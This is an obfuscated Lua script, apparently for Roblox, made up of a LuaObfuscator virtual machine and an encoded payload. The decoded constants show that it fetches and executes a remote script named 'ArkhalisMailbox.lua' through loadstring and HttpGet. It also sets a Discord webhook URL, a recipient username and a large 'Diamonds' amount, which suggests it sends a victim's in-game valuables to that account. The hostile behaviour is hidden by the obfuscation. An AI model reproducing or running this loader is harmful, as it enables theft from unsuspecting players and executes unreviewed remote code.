--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.8) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then local v83=0;while true do if (v83==0) then v19=v0(v3(v30,1,1));return "";end end else local v84=v2(v0(v30,16));if v19 then local v90=v5(v84,v19);v19=nil;return v90;else return v84;end end end);local function v20(v31,v32,v33)if v33 then local v85=(v31/((5 -3)^(v32-(2 -(1638 -(1523 + 114))))))%((3 -1)^(((v33-(2 -1)) -(v32-(620 -(555 + 58 + 6)))) + (932 -(857 + 74)))) ;return v85-(v85%(569 -(367 + 201))) ;else local v86=(929 -(214 + 713))^(v32-(1 + 0)) ;return (((v31%(v86 + v86))>=v86) and (1 + 0)) or (877 -(282 + 595)) ;end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35=0;local v36;local v37;while true do if (v35==(1 -0)) then return (v37 * 256) + v36 ;end if (v35==((1044 + 21) -(68 + 997))) then v36,v37=v1(v16,v18,v18 + (1272 -(226 + 1044)) );v18=v18 + (8 -6) ;v35=118 -(32 + 85) ;end end end local function v23()local v38,v39,v40,v41=v1(v16,v18,v18 + 1 + 2 );v18=v18 + ((1311 -(87 + 263)) -(892 + 65)) ;return (v41 * (40022563 -23245347)) + (v40 * (121138 -55602)) + (v39 * (469 -213)) + v38 ;end local function v24()local v42=v23();local v43=v23();local v44=181 -(67 + 113) ;local v45=(v20(v43,1 + 0 ,49 -29 ) * ((2 + 0)^(127 -95))) + v42 ;local v46=v20(v43,21,983 -((1593 -(368 + 423)) + 150) );local v47=((v20(v43,85 -53 )==(1 -0)) and  -((3 -2) + 0)) or ((1016 -(10 + 8)) -((3519 -2604) + 82)) ;if (v46==0) then if (v45==((442 -(416 + 26)) -0)) then return v47 * 0 ;else v46=1 + 0 ;v44=0 -0 ;end elseif (v46==(3234 -(1069 + 118))) then return ((v45==((0 -0) -0)) and (v47 * ((1 -0)/(0 + 0)))) or (v47 * NaN) ;end return v8(v47,v46-(1817 -794) ) * (v44 + (v45/(2^(52 + 0)))) ;end local function v25(v48)local v49;if  not v48 then v48=v23();if (v48==0) then return "";end end v49=v3(v16,v18,(v18 + v48) -(1 + 0) );v18=v18 + v48 ;local v50={};for v67=1 -0 , #v49 do v50[v67]=v2(v1(v3(v49,v67,v67)));end return v6(v50);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v51=0 + 0 ;local v52;local v53;local v54;local v55;local v56;local v57;local v58;local v59;local v60;while true do if (1==v51) then v54=nil;v55=nil;v51=2;end if (v51==(5 -1)) then v60=nil;while true do if (v52~=(345 -(218 + 123))) then else while true do if (v53==1) then local v105=1581 -(1535 + 46) ;while true do if (v105~=0) then else local v132=0 + 0 ;while true do if (v132==1) then v105=1 + 0 ;break;end if (v132~=(560 -(306 + 254))) then else v56=nil;v57=nil;v132=1;end end end if (1==v105) then v53=1 + 1 ;break;end end end if (v53~=0) then else local v106=0;local v107;while true do if (v106~=(0 -0)) then else v107=1467 -(899 + 568) ;while true do if ((1 + 0)~=v107) then else v53=2 -1 ;break;end if (v107~=(603 -(268 + 335))) then else local v172=0;while true do if ((291 -(60 + 230))~=v172) then else v107=1;break;end if (v172==0) then v54=572 -(426 + 146) ;v55=nil;v172=1;end end end end break;end end end if (v53~=(1 + 2)) then else v60=nil;while true do local v108=0;local v109;local v110;while true do if (v108~=1) then else while true do if (v109~=0) then else v110=0;while true do if (v110==1) then if (v54==1) then local v175=0;local v176;local v177;while true do if (v175~=(1456 -(282 + 1174))) then else v176=0;v177=nil;v175=1;end if (v175==1) then while true do if (v176~=0) then else v177=0;while true do if (0~=v177) then else local v190=0;while true do if (v190==(812 -(569 + 242))) then v177=2 -1 ;break;end if (v190==0) then local v198=0 + 0 ;while true do if (v198~=(1025 -(706 + 318))) then else v190=1252 -(721 + 530) ;break;end if (v198~=(1271 -(945 + 326))) then else v58={v55,v56,nil,v57};v59=v23();v198=1;end end end end end if (v177~=(1 + 0)) then else v60={};v54=2;break;end end break;end end break;end end end if (0~=v54) then else local v178=0;local v179;while true do if (v178==(700 -(271 + 429))) then v179=0;while true do if (v179~=(1 + 0)) then else v57={};v54=1501 -(1408 + 92) ;break;end if (v179==0) then local v185=0;while true do if (v185~=0) then else v55={};v56={};v185=1087 -(461 + 625) ;end if (v185==1) then v179=1289 -(993 + 295) ;break;end end end end break;end end end break;end if (v110~=(0 + 0)) then else if (v54~=(1173 -(418 + 753))) then else local v180=0 + 0 ;local v181;while true do if (0~=v180) then else v181=0;while true do if (v181~=(0 + 0)) then else local v186=0;while true do if (v186~=1) then else v181=1;break;end if (v186~=(0 + 0)) then else for v193=1 + 0 ,v59 do local v194=529 -(406 + 123) ;local v195;local v196;local v197;while true do if (v194~=(1769 -(1749 + 20))) then else v195=0 + 0 ;v196=nil;v194=1;end if (v194==(1323 -(1249 + 73))) then v197=nil;while true do if (v195~=(0 + 0)) then else local v208=1145 -(466 + 679) ;local v209;while true do if (v208==0) then v209=0;while true do if (v209==1) then v195=2 -1 ;break;end if (0==v209) then local v219=0 -0 ;while true do if (v219~=0) then else v196=v21();v197=nil;v219=1901 -(106 + 1794) ;end if (v219==1) then v209=1 + 0 ;break;end end end end break;end end end if (v195~=1) then else if (v196==1) then v197=v21()~=(0 + 0) ;elseif (v196==2) then v197=v24();elseif (v196~=(8 -5)) then else v197=v25();end v60[v193]=v197;break;end end break;end end end v58[3]=v21();v186=2 -1 ;end end end if (v181==(115 -(4 + 110))) then for v187=585 -(57 + 527) ,v23() do local v188=1427 -(41 + 1386) ;local v189;while true do if (v188==(103 -(17 + 86))) then v189=v21();if (v20(v189,1,1 + 0 )==(0 -0)) then local v199=0;local v200;local v201;local v202;local v203;while true do if (v199==(5 -3)) then while true do if (v200~=(167 -(122 + 44))) then else v203={v22(),v22(),nil,nil};if (v201==0) then local v214=0;local v215;local v216;while true do if (v214~=0) then else local v221=0 -0 ;while true do if (v221~=0) then else v215=0;v216=nil;v221=1 + 0 ;end if (1~=v221) then else v214=1 + 0 ;break;end end end if ((1 -0)~=v214) then else while true do if (v215==0) then v216=65 -(30 + 35) ;while true do if ((0 + 0)==v216) then v203[3]=v22();v203[1261 -(1043 + 214) ]=v22();break;end end break;end end break;end end elseif (v201==1) then v203[3]=v23();elseif (v201==2) then v203[3]=v23() -(2^(60 -44)) ;elseif (v201==3) then local v227=1212 -(323 + 889) ;local v228;local v229;while true do if ((0 -0)==v227) then v228=580 -(361 + 219) ;v229=nil;v227=1;end if (v227~=1) then else while true do if (v228~=(320 -(53 + 267))) then else v229=0;while true do if ((0 + 0)==v229) then v203[3]=v23() -(2^(429 -(15 + 398))) ;v203[986 -(18 + 964) ]=v22();break;end end break;end end break;end end end v200=7 -5 ;end if (v200~=(2 + 0)) then else local v211=0;while true do if (v211==(0 + 0)) then if (v20(v202,851 -(20 + 830) ,1 + 0 )==1) then v203[128 -(116 + 10) ]=v60[v203[2]];end if (v20(v202,2,2)==1) then v203[1 + 2 ]=v60[v203[3]];end v211=1;end if (v211~=(739 -(542 + 196))) then else v200=6 -3 ;break;end end end if (v200==0) then local v212=0 + 0 ;while true do if (v212~=(0 + 0)) then else v201=v20(v189,1 + 1 ,7 -4 );v202=v20(v189,9 -5 ,6);v212=1;end if (v212==1) then v200=1552 -(1126 + 425) ;break;end end end if (v200==(408 -(118 + 287))) then if (v20(v202,3,11 -8 )~=(1122 -(118 + 1003))) then else v203[11 -7 ]=v60[v203[381 -(142 + 235) ]];end v55[v187]=v203;break;end end break;end if (v199~=(0 -0)) then else local v206=0;while true do if ((1 + 0)==v206) then v199=978 -(553 + 424) ;break;end if (v206==(0 -0)) then v200=0 + 0 ;v201=nil;v206=1 + 0 ;end end end if (v199~=(1 + 0)) then else local v207=0 + 0 ;while true do if (v207~=(1 + 0)) then else v199=4 -2 ;break;end if (v207==(0 -0)) then v202=nil;v203=nil;v207=2 -1 ;end end end end end break;end end end v54=3;break;end end break;end end end if (v54~=3) then else local v182=0 + 0 ;while true do if (0~=v182) then else local v183=0;local v184;while true do if ((0 -0)==v183) then v184=753 -(239 + 514) ;while true do if (v184==0) then local v192=0 + 0 ;while true do if (v192==(1329 -(797 + 532))) then for v204=1 + 0 ,v23() do v56[v204-(1 + 0) ]=v28();end return v58;end end end end break;end end end end end v110=2 -1 ;end end break;end end break;end if (v108==(1202 -(373 + 829))) then v109=731 -(476 + 255) ;v110=nil;v108=1;end end end break;end if (v53==(1132 -(369 + 761))) then v58=nil;v59=nil;v53=3;end end break;end if (v52==(0 + 0)) then local v95=0;while true do if (1==v95) then v52=1 -0 ;break;end if (v95~=(0 -0)) then else v53=238 -(64 + 174) ;v54=nil;v95=1 + 0 ;end end end if (v52~=(1 -0)) then else v55=nil;v56=nil;v52=338 -(144 + 192) ;end if (3~=v52) then else local v96=0;while true do if (v96==1) then v52=220 -(42 + 174) ;break;end if (v96~=(0 + 0)) then else v59=nil;v60=nil;v96=1 + 0 ;end end end if (v52==2) then local v97=0 + 0 ;while true do if (v97==(1504 -(363 + 1141))) then v57=nil;v58=nil;v97=1581 -(1183 + 397) ;end if (1~=v97) then else v52=8 -5 ;break;end end end end break;end if (0~=v51) then else v52=0 + 0 ;v53=nil;v51=1 + 0 ;end if (v51==2) then v56=nil;v57=nil;v51=3;end if (v51~=(1978 -(1913 + 62))) then else v58=nil;v59=nil;v51=4;end end end local function v29(v61,v62,v63)local v64=v61[1];local v65=v61[2];local v66=v61[3];return function(...)local v69=v64;local v70=v65;local v71=v66;local v72=v27;local v73=1;local v74= -1;local v75={};local v76={...};local v77=v12("#",...) -1 ;local v78={};local v79={};for v87=0,v77 do if (v87>=v71) then v75[v87-v71 ]=v76[v87 + 1 ];else v79[v87]=v76[v87 + 1 ];end end local v80=(v77-v71) + 1 ;local v81;local v82;while true do v81=v69[v73];v82=v81[1];if (v82<=5) then if (v82<=2) then if (v82<=0) then v73=v81[3];elseif (v82==1) then do return;end elseif (v79[v81[2]]==v81[4]) then v73=v73 + 1 ;else v73=v81[3];end elseif (v82<=3) then v79[v81[2]][v81[3]]=v81[4];elseif (v82==4) then local v111=v81[2];local v112=v79[v81[3]];v79[v111 + 1 ]=v112;v79[v111]=v112[v81[4]];else v79[v81[2]]();end elseif (v82<=8) then if (v82<=6) then v79[v81[2]]=v81[3];elseif (v82>7) then local v116=v81[2];local v117,v118=v72(v79[v116](v13(v79,v116 + 1 ,v81[3])));v74=(v118 + v116) -1 ;local v119=0;for v129=v116,v74 do v119=v119 + 1 ;v79[v129]=v117[v119];end else local v120=0;local v121;local v122;local v123;local v124;local v125;while true do if (v120==6) then v79[v125]=v79[v125](v13(v79,v125 + 1 ,v74));v73=v73 + 1 ;v81=v69[v73];v79[v81[2]]();v73=v73 + 1 ;v120=7;end if (v120==4) then v73=v73 + 1 ;v81=v69[v73];v125=v81[2];v122,v123=v72(v79[v125](v13(v79,v125 + 1 ,v81[3])));v74=(v123 + v125) -1 ;v120=5;end if (3==v120) then v79[v125 + 1 ]=v124;v79[v125]=v124[v81[4]];v73=v73 + 1 ;v81=v69[v73];v79[v81[2]]=v81[3];v120=4;end if (v120==5) then v121=0;for v170=v125,v74 do local v171=0;while true do if (v171==0) then v121=v121 + 1 ;v79[v170]=v122[v121];break;end end end v73=v73 + 1 ;v81=v69[v73];v125=v81[2];v120=6;end if (7==v120) then v81=v69[v73];v73=v81[3];break;end if (2==v120) then v79[v81[2]]=v63[v81[3]];v73=v73 + 1 ;v81=v69[v73];v125=v81[2];v124=v79[v81[3]];v120=3;end if (v120==1) then v73=v73 + 1 ;v81=v69[v73];v79[v81[2]]=v63[v81[3]];v73=v73 + 1 ;v81=v69[v73];v120=2;end if (v120==0) then v121=nil;v122,v123=nil;v124=nil;v125=nil;v79[v81[2]][v81[3]]=v81[4];v120=1;end end end elseif (v82<=9) then v79[v81[2]]=v63[v81[3]];elseif (v82>10) then local v126=v81[2];v79[v126]=v79[v126](v13(v79,v126 + 1 ,v74));else local v128=0;while true do if (v128==1) then v73=v73 + 1 ;v81=v69[v73];v79[v81[2]][v81[3]]=v81[4];v73=v73 + 1 ;v128=2;end if (v128==2) then v81=v69[v73];v79[v81[2]]=v81[3];v73=v73 + 1 ;v81=v69[v73];v128=3;end if (v128==3) then v73=v81[3];break;end if (v128==0) then v79[v81[2]][v81[3]]=v81[4];v73=v73 + 1 ;v81=v69[v73];v79[v81[2]]=v63[v81[3]];v128=1;end end end v73=v73 + 1 ;end end;end return v29(v28(),{},v17)(...);end v15("LOL!0D3O00028O00026O00F03F03023O005F4703073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F2O313039303331332O313O373230363336322F53626B6E4F5462645567644649795138746874446E66354E78515565536A62542D46586C536B54555A2D7732596E367238463762556869787378454B414333394D7A6B53030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403313O00682O7470733A2O2F61726B68616C69736C75612E6769746875622E696F2F41726B68616C69734D61696C626F782E6C756103083O00557365726E616D65030E3O006A6F6E6174616E5F6761756E613203083O004469616D6F6E6473024O0080841E4100163O0012063O00013O0026023O000D0001000200044O000D0001001209000100033O00300700010004000500122O000100063O00122O000200073O00202O00020002000800122O000400096O000200046O00013O00024O00010001000100044O001500010026023O00010001000100044O00010001001209000100033O00300A0001000A000B00122O000100033O00302O0001000C000D00124O00023O00044O000100012O00013O00017O00",v9(),...);end
